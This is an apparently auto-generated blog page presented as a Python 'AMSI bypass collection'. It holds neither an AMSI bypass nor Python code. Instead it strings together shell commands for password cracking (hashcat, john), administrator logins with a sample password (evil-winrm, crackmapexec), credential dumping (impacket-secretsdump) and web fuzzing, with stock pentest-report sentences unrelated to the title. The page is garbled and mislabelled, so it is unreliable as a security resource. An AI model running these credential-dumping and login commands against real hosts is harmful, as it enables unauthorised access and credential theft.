---
TitleSEO: "AMSI Bypass Collection in Python | ZureFX"
TitlePost: "AMSI Bypass Collection — Python"
Author: "ZureFX"
Description: "A Python script for amsi bypass collection. Built for security research and automation."
Keywords: "c, script, rust, bash, tool, powershell, python"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-530.html"
URL_IMAGES: ""
Date: "2025-12-24"
Tags: "C, Script, Rust, Bash, Tool, PowerShell, Python"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-530"
Permalink: "/scripting/script-amsi-bypass-collection-530.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `burpsuite`
- `rpcclient`
- `nikto`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.113.139.246 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.78.200.185 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.135.81
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.10.211/FUZZ
evil-winrm -i 10.21.250.137 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.135.201/FUZZ
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 18.40s
```
